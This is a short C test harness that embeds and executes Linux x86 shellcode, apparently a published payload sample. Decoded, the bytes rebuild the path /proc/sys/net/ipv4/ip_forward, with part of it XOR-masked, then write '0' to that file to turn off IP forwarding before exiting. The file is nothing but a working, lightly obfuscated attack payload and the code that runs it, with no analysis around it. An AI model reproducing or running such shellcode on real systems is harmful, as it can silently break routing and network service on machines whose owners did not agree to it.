#include<stdio.h>
#include<string.h>

unsigned char code[] = \
"\x31\xc9\xf7\xe1\x50\xbb\x5f\x66\x6f\x72\x81\xf3\x28\x07\x1d\x16\x53\x68\x5f\x66\x6f\x72\x68\x34\x2f\x69\x70\x68\x2f\x69\x70\x76\x68\x2f\x6e\x65\x74\x68\x73\x79\x73\x2f\x68\x72\x6f\x63\x2f\x66\x68\x2f\x70\x89\xe3\x31\xc9\xb1\x01\xb0\x06\xfe\xc8\xcd\x80\x89\xc3\x31\xc9\x51\x6a\x30\x89\xe1\x31\xd2\xb2\x01\xb0\x03\xfe\xc0\xcd\x80\x31\xc0\x83\xc0\x06\xcd\x80\x31\xc0\x83\xc0\x01\x31\xdb\xcd\x80";
main()
{

	printf("Shellcode Length:  %d\n", strlen(code));

	int (*ret)() = (int(*)())code;

	ret();

}

	
